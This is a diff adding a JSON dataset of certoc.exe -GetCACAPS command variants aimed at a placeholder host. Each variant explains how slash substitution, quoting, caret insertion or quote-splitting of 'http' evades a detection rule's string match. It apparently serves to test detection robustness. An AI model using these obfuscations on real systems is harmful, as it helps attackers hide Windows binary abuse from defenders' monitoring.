@@ -1,0 +1,18 @@
+[
+  {
+    "output": "\"C:\\Windows\\SysWOW64\\certoc.exe\" /GetCACAPS http://192.0.2.10/certsrv/",
+    "explanation": "Substitution technique: Built-in Microsoft binaries leveraging standard Windows CLI parsing frameworks generally treat forward slashes ('/') and hyphens ('-') as interchangeable parameter switch indicators. Substituting '-GetCACAPS' with '/GetCACAPS' completely subverts the literal check in 'selection_cli' while achieving identical evaluation results."
+  },
+  {
+    "output": "\"C:\\Windows\\SysWOW64\\certoc.exe\" \"-GetCACAPS\" http://192.0.2.10/certsrv/",
+    "explanation": "Insertion technique: Enclosing the parameter switch key string inside double quotes ('\"-GetCACAPS\"') disrupts the continuous literal character string matching rules monitoring the event stream. The native Windows argument tokenizer unquotes parameters during initialization, preserving expected binary execution behavior."
+  },
+  {
+    "output": "cmd.exe /c \"\"C:\\Windows\\SysWOW64\\certoc.exe\" -GetCA^CAPS http://192.0.2.10/certsrv/\"",
+    "explanation": "Insertion technique: Spawning the binary through cmd.exe permits the insertion of a command shell caret escape character ('^') directly into the switch token. The outer processor strips the caret token before process execution, logging '-GetCA^CAPS' in process creation telemetry and evading 'selection_cli'."
+  },
+  {
+    "output": "\"C:\\Windows\\SysWOW64\\certoc.exe\" -GetCACAPS h\"tt\"p://192.0.2.10/certsrv/",
+    "explanation": "Insertion technique: Inserting consecutive double quotes inside the protocol schema token ('h\"tt\"p') breaks up the strict linear substring match for 'http'. The application's network string handler parses the expanded parameter accurately, leaving functional test behavior unimpaired."
+  }
+]
